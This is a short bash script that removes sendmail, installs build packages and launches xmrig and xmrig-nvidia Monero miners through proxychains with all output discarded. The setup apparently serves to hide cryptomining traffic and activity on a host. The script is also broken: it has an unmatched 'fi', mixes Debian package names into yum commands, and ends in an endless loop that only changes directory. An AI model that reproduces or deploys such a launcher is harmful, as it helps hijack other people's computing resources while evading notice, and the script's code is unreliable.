#!/bin/bash
sudo yum remove sendmail -y
sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
cd /m/test01/xmrig-nvidia/build

/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig-nvidia/build/xmrig-nvidia --config=/m/test01/xmrig-nvidia/build/config.json 2>&1 1> /dev/null
/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig/build/xmrig --config=/m/test01/xmrig/build/config.json 2>&1 1> /dev/null
  
fi
while true; do
cd /m/test01/xmr/
#sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
done
